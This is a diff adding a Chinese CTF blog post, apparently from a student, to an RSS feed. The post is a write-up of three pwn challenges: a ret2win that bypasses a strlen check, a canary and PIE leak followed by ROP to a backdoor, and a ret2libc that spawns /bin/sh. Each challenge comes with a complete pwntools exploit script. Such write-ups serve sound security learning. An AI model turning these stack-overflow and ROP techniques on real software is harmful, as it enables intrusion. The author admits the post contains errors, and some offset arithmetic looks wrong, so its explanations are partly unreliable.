@@ -1,4 +1,418 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>2026第一周wp05</title><link>https://dxfaker.top/posts/26moe5/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe5/</guid><description>12号很累</description><pubDate>Sun, 13 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>dxfaker&apos;s blog</title><description>一个默默无闻的小站</description><link>https://dxfaker.top/</link><language>en</language><item><title>ret2win,ret2libc的wp</title><link>https://dxfaker.top/posts/26moe6/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe6/</guid><description>啊啊啊啊啊事情好多啊</description><pubDate>Mon, 14 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
+&lt;p&gt;此为第一版，貌似错误挺多的，后面再修吧&lt;/p&gt;
+&lt;h1&gt;omg电台炸了&lt;/h1&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;   Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;没有PIE，但是有canary,还是需要泄露&lt;/p&gt;
+&lt;p&gt;看main函数逻辑&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned __int8 v4; // [rsp+Fh] [rbp-A1h] BYREF
+  _QWORD v5[9]; // [rsp+10h] [rbp-A0h] BYREF
+  char v6; // [rsp+58h] [rbp-58h]
+  _QWORD v7[8]; // [rsp+60h] [rbp-50h] BYREF
+  void (*v8)(void); // [rsp+A0h] [rbp-10h]
+
+  memset(v7, 0, sizeof(v7));
+  v8 = (void (*)(void))show_status;
+  memset(v5, 0, sizeof(v5));
+  v6 = 0;
+  IO_setvbuf(stdin, 0, 2, 0);
+  IO_setvbuf(stdout, 0, 2, 0);
+  alarm(30);
+  IO_puts(&quot;=== Faulty Radio Hardware ===&quot;);
+  IO_puts(&quot;[hardware] Recovery controller online.&quot;);
+  IO_puts(&quot;[hardware] Send a length-prefixed encrypted repair message.&quot;);
+  IO_puts(&quot;Enter repair ciphertext:&quot;);
+  read_exact(&amp;amp;v4, 1);
+  if ( v4 &amp;amp;&amp;amp; v4 &amp;lt;= 0x48u )
+  {
+    read_exact(v5, v4);
+    if ( (unsigned __int64)j_strlen(v5) &amp;lt;= 0x20 )
+    {
+      j___new_memcpy(v7, v5, v4);
+      v8();
+    }
+    else
+    {
+      IO_puts(&quot;[hardware] Repair cipher is too long.&quot;);
+    }
+    return 0;
+  }
+  else
+  {
+    IO_puts(&quot;[hardware] Invalid frame length.&quot;);
+    return 0;
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;依旧alarm,欸没有canary防护欸&lt;/p&gt;
+&lt;p&gt;复习一下&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;memcpy(v7, v5, v4);&lt;/code&gt; 是 C 标准库函数 &lt;code&gt;memcpy&lt;/code&gt; 的调用，功能是：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;从源地址 &lt;code&gt;v5&lt;/code&gt; 开始，复制 &lt;code&gt;v4&lt;/code&gt; 个字节到目标地址 &lt;code&gt;v7&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;也就是说，有两轮检查,第一轮检查v4的上界,第二轮检查v5的长度&lt;/p&gt;
+&lt;p&gt;常见指令长度示例（x86-64）&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;指令&lt;/th&gt;
+&lt;th&gt;字节数&lt;/th&gt;
+&lt;th&gt;机器码示例&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;ret&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;c3&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;push rbp&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;55&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;pop rdi&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;5f&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;pop rdi; ret&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;5f c3&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;mov rbp, rsp&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;3&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;48 89 e5&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;call rel32&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;5&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;e8 xx xx xx xx&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;jmp rel32&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;5&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;e9 xx xx xx xx&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;syscall&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;0f 05&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;然后调用v8(指针),v8原本指向的是一个说明(show_status)&lt;/p&gt;
+&lt;p&gt;然后就是找后门环节&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/moectf/omg电台出问题了/attachment$ strings -a -t x radio_relay | grep &apos;/flag&apos;
+  7e04a /flag
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;有后门&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 repair_complete()
+{
+  _QWORD v1[16]; // [rsp+0h] [rbp-90h] BYREF
+  __int64 v2; // [rsp+80h] [rbp-10h]
+  int v3; // [rsp+8Ch] [rbp-4h]
+
+  memset(&amp;amp;v1[1], 0, 120);
+  v3 = _open(&quot;/flag&quot;, 0, 0);
+  if ( v3 &amp;lt; 0 )
+  {
+    IO_puts(&quot;[hardware] Repair completed, but the diagnostic record is unavailable.&quot;);
+    exit(1);
+  }
+  v2 = _libc_read((unsigned int)v3, v1, 127);
+  if ( v2 &amp;gt; 0 )
+  {
+    _libc_write(1, &quot;[hardware] Repair completed: &quot;, 29);
+    _libc_write(1, v1, v2);
+  }
+  return _libc_close((unsigned int)v3);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;shift+F12,ctrl+F&lt;/p&gt;
+&lt;p&gt;那就是栈溢出+跳转,ret2win&lt;/p&gt;
+&lt;p&gt;目前来看,能操作的就是memcpy,你这样想,v7只有50h,v5可以被我控制，那不就可以造栈溢出了。&lt;/p&gt;
+&lt;p&gt;这个时候有人问了，v5不是有长度检查吗,你想鸡毛&lt;/p&gt;
+&lt;p&gt;唉我真得整理一篇检查绕后了&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;strlen(v5)&lt;/code&gt; 遇到第一个 &lt;code&gt;\x00&lt;/code&gt; 就会停止计数，返回之前的长度。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;也就是说，我们的打入数据一开始就放一个\00就可以绕过检查了&lt;/p&gt;
+&lt;p&gt;ok&lt;/p&gt;
+&lt;p&gt;exp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+p = remote(&apos;127.0.0.1&apos;, 65365) 
+# p = process(&apos;./radio_relay&apos;)
+win_place = 0x40182A
+
+payload = b&apos;\x00&apos; + b&apos;A&apos; * (64 - 1) + p64(win_place)
+
+p.recvuntil(b&apos;Enter repair ciphertext:&apos;)
+p.send(bytes([len(payload)]))
+p.send(payload)
+
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;hard_overflow&lt;/h1&gt;
+&lt;p&gt;这个是25aurora的&lt;/p&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PIE+NX+canary&lt;/p&gt;
+&lt;p&gt;main&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  _QWORD buf[2]; // [rsp+0h] [rbp-20h] BYREF
+  int v5; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  init(argc, argv, envp);
+  buf[0] = 0;
+  buf[1] = 0;
+  v5 = 0;
+  printf(&quot;Username: &quot;);
+  read(0, buf, 0x80u);
+  printf(&quot;Hello, %s\n&quot;, (const char *)buf);
+  vuln();
+  return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;再看vuln&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;__int64 vuln()
+{
+  char buf[32]; // [rsp+0h] [rbp-50h] BYREF
+  char dest[40]; // [rsp+20h] [rbp-30h] BYREF
+  unsigned __int64 v3; // [rsp+48h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf(&quot;Password: &quot;);
+  read(0, buf, 0x80u);
+  printf(&quot;Repeat the password to ensure: %s\n&quot;, buf);
+  strcpy(dest, buf);
+  read(0, buf, 0x80u);
+  if ( strcmp(dest, buf) )
+    exit(-1);
+  return 1;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;[rbp-8h]意味着v3是canary&lt;/p&gt;
+&lt;p&gt;看看汇编&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0000000000001233 ; __unwind {
+.text:0000000000001233                 push    rbp
+.text:0000000000001234                 mov     rbp, rsp
+.text:0000000000001237                 sub     rsp, 20h
+.text:000000000000123B                 mov     [rbp+var_18], rdi
+.text:000000000000123F                 mov     rax, fs:28h
+.text:0000000000001248                 mov     [rbp+var_8], rax
+.text:000000000000124C                 xor     eax, eax
+.text:000000000000124E                 mov     edi, 20h ; &apos; &apos;  ; size
+.text:0000000000001253                 call    _malloc
+.text:0000000000001258                 mov     [rbp+command], rax
+.text:000000000000125C                 mov     rax, [rbp+command]
+.text:0000000000001260                 mov     rdx, 68732F6E69622Fh
+.text:000000000000126A                 mov     [rax], rdx
+.text:000000000000126D                 mov     rax, 1145141919810721h
+.text:0000000000001277                 cmp     [rbp+var_18], rax
+.text:000000000000127B                 jnz     short loc_128B
+.text:000000000000127D                 mov     rax, [rbp+command]
+.text:0000000000001281                 mov     rdi, rax        ; command
+.text:0000000000001284                 call    _system
+.text:0000000000001289                 jmp     short loc_129A
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以看到，rdi传入给栈帧var_18，然后再鸡巴和神秘小数字比较(我操，恶俗啊)也就是说后门拿到shell的条件是要让rdi变成神秘小数字,也就是需要吧rdi弹出(pop_rdi)，再给他赋值&lt;/p&gt;
+&lt;p&gt;这个时候有人就要问了，为什么不是通过入栈赋值呢你个唐&lt;/p&gt;
+&lt;p&gt;这就要讲到linux64调用参数规定了,&lt;strong&gt;前六个参数都是直接通过寄存器传递的&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;第 1 个参数 → &lt;code&gt;rdi&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;第 2 个参数 → &lt;code&gt;rsi&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;第 3 个参数 → &lt;code&gt;rdx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;第 4 个参数 → &lt;code&gt;rcx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;第 5 个参数 → &lt;code&gt;r8&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;第 6 个参数 → &lt;code&gt;r9&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;只有第 7 个及以后的参数才压栈&lt;/p&gt;
+&lt;p&gt;那要怎么操作呢&lt;/p&gt;
+&lt;h3&gt;&lt;code&gt;pop rdi; ret&lt;/code&gt;&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;[pop_rdi 的地址]   ← ret 会跳到这里
+[0x1145141919810721] ← pop rdi 会把这个值弹到 rdi
+[backdoor 的地址]  ← pop rdi 后的 ret 会跳到这里
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;函数结束，ret跳转到pop_rdi，执行该操作，然后赋值给rdi,执行完的ret再跳转到后门，即可操作&lt;/p&gt;
+&lt;p&gt;What_s_this ？&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;text:0000000000001374 What_s_this     proc near
+.text:0000000000001374 ; __unwind {
+.text:0000000000001374                 pop     rdi
+.text:0000000000001375                 pop     rsi
+.text:0000000000001376                 retn
+.text:0000000000001376 What_s_this     endp ; sp-analysis failed
+.text:0000000000001376
+.text:0000000000001376 ; ---------------------------------------------------------------------------
+.text:0000000000001377                 db 2Bh dup(90h)
+.text:0000000000001377 ; } // starts at 1374
+.text:00000000000013A2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;rdi也不缺了&lt;/p&gt;
+&lt;p&gt;那回到mian函数，我们需要构造栈溢出，对吧&lt;/p&gt;
+&lt;p&gt;你都printf我输入的buf那还说啥&lt;/p&gt;
+&lt;p&gt;canary再uesr&apos;sname阶段就可以解决了&lt;/p&gt;
+&lt;p&gt;vuln的两个read都溢出，一个泄露真实地址，一个跳转,偏移通过未知数计算即可，读取一个赋值一个就好&lt;/p&gt;
+&lt;p&gt;先看canary泄露的操作&lt;/p&gt;
+&lt;p&gt;看栈帧开辟:&lt;/p&gt;
+&lt;p&gt;0x20-0x8=0x12，那么要先塞0x12才到canary的地址+&quot;\x99&quot; （canary最低字节恒为0x00）&lt;/p&gt;
+&lt;p&gt;那我们塞满他的话，程序就会一直打印知道null为止,显然我们的填充字节不会爆null，那么canary就一定会被泄露&lt;/p&gt;
+&lt;p&gt;但此时的canary不是完整的，需要&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;canary = b&quot;\x00&quot; + canary7
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;接着进入vuln，构造栈溢出，跟第一次一样&lt;/p&gt;
+&lt;p&gt;但是这次让printf一直打印到返回地址处，返回地址正好压入的是main的返回地址，那我们要填充多少字节呢&lt;/p&gt;
+&lt;p&gt;[rbp-50h]+ 0x8,因为返回地址永远在 rbp + 8&lt;/p&gt;
+&lt;p&gt;你再去查call里的返回地址偏移，汇编左边那个栏目，可以得到0x1429&lt;/p&gt;
+&lt;p&gt;得到0x1429之后就可以算base了&lt;/p&gt;
+&lt;p&gt;base=返回地址-0x1429&lt;/p&gt;
+&lt;p&gt;第三轮的ROP就不多赘述了&lt;/p&gt;
+&lt;p&gt;ok那大差不差了&lt;/p&gt;
+&lt;p&gt;exp(感谢leyi的馈赠)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+context(arch=&apos;amd64&apos;, os=&apos;linux&apos;, log_level=&apos;debug&apos;)
+context.terminal = [&apos;cmd.exe&apos;, &apos;/c&apos;, &apos;start&apos;, &apos;/MAX&apos;, &apos;bash.exe&apos;, &apos;-c&apos;]
+
+p = process(&apos;./hardoverflow&apos;)
+# p = gdb.debug(&apos;./hardoverflow&apos;)
+# p = remote(&apos;node.szu.moe&apos;, 10390)
+
+p.recvuntil(b&apos;Username: &apos;)
+p.send(b&apos;a&apos;*0x19)
+p.recvn(0x20)
+canary = b&apos;\x00&apos; + p.recvn(7)
+log.success(&apos;get canary --&amp;gt; &apos; + canary.hex())
+
+p.recvuntil(b&apos;Password: &apos;)
+p.send(b&apos;a&apos;*0x58)
+p.recvn(0x77)
+real_addr = u64(p.recvn(6).ljust(8, b&apos;\x00&apos;))
+base_addr = real_addr - 0x1429
+log.success(&apos;get elf_base --&amp;gt; &apos; + hex(base_addr))
+
+p.recvline()
+payload = flat(
+    b&apos;a&apos;*0x1f,
+    b&apos;\x00&apos;,
+    b&apos;a&apos;*0x1f,
+    b&apos;\x00&apos;,
+    b&apos;a&apos;*0x8,
+    canary,
+    b&apos;a&apos;*0x8,
+    base_addr + 0x1374,
+    0x1145141919810721,
+    0,
+    base_addr + 0x1233
+)
+p.send(payload)
+
+p.interactive()
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;hard_libc&lt;/h1&gt;
+&lt;p&gt;checksec&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;只有NX&lt;/p&gt;
+&lt;p&gt;再看main&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  puts(&quot;No gift for you this time! Say something\n&quot;);
+  putchar(62);
+  return read(0, buf, 0x100u);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;很明显的栈溢出&lt;/p&gt;
+&lt;p&gt;What_s_this&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;text:0000000000401185 ; void What_s_this()
+.text:0000000000401185                 public What_s_this
+.text:0000000000401185 What_s_this     proc near
+.text:0000000000401185 ; __unwind {
+.text:0000000000401185                 pop     rdi
+.text:0000000000401186                 pop     rsi
+.text:0000000000401187                 retn
+.text:0000000000401187 What_s_this     endp ; sp-analysis failed
+.text:0000000000401187
+.text:0000000000401187 ; ---------------------------------------------------------------------------
+.text:0000000000401188                 db 0Bh dup(90h)
+.text:0000000000401188 ; } // starts at 401185
+.text:0000000000401193
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;给rdi了&lt;/p&gt;
+&lt;p&gt;以及没有后门&lt;/p&gt;
+&lt;p&gt;那就只能去libc.so.6去找&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/aurora25/hard_libc/hard_libc$ readelf -s ./libc.so.6 | grep system
+  1481: 0000000000050d70    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
+(base) dxfaker@LAPTOP-US9FCLPD:/mnt/d/ctf/flag/pwn/aurora25/hard_libc/hard_libc$ strings -a -t x ./libc.so.6 | grep &apos;/bin/sh&apos;
+ 1d8678 /bin/sh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;于是我什么都不缺了.jpg&lt;/p&gt;
+&lt;p&gt;攻击思路&lt;/p&gt;
+&lt;p&gt;由于只有一次调用，所以我们得泄露一次其真实地址（跳过ASLR），然后重新跑一遍跳转到system以及/bin/sh&lt;/p&gt;
+&lt;p&gt;额延迟绑定机制就不在这里教了&lt;/p&gt;
+&lt;p&gt;总之我们需要的是rdi,rsi放个0占位就好&lt;/p&gt;
+&lt;p&gt;exp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from pwn import *
+
+elf = ELF(&apos;./hardlibc&apos;)
+libc = ELF(&apos;./libc.so.6&apos;)
+
+pop_rdi_pop_rsi = 0x401185
+main_addr = elf.symbols[&apos;main&apos;]
+ret = 0x401016
+
+payload1 = b&apos;a&apos; * 40 + p64(pop_rdi_pop_rsi) + p64(elf.got[&apos;puts&apos;]) + p64(0) + p64(elf.plt[&apos;puts&apos;]) + p64(main_addr)
+
+p = remote(&quot;node.szu.moe&quot;, 10011)
+# p = process(&apos;./hardlibc&apos;)
+p.sendline(payload1)
+leak = p.recvline().strip().ljust(8, b&apos;\x00&apos;)
+puts_addr = u64(leak)
+libc_base = puts_addr - libc.symbols[&apos;puts&apos;]
+system_addr = libc_base + libc.symbols[&apos;system&apos;]
+binsh_addr = libc_base + next(libc.search(b&apos;/bin/sh&apos;))
+
+payload2 = b&apos;A&apos; * 40
+payload2 += p64(ret)                    
+payload2 += p64(pop_rdi_pop_rsi)         
+payload2 += p64(binsh_addr)             
+payload2 += p64(0)                      
+payload2 += p64(system_addr)            
+p.sendline(payload2)
+p.interactive()
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>2026第一周wp05</title><link>https://dxfaker.top/posts/26moe5/</link><guid isPermaLink="true">https://dxfaker.top/posts/26moe5/</guid><description>12号很累</description><pubDate>Sun, 13 Sep 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;写在前面&lt;/h1&gt;
 &lt;p&gt;第一双神了，有了点问题于是12号鸽了，现在是13号1:14，更新完准备睡觉&lt;/p&gt;
 &lt;p&gt;第二版说明:早上起来发现没更新到，故修复一下&lt;/p&gt;
 &lt;h1&gt;外卖补贴&lt;/h1&gt;
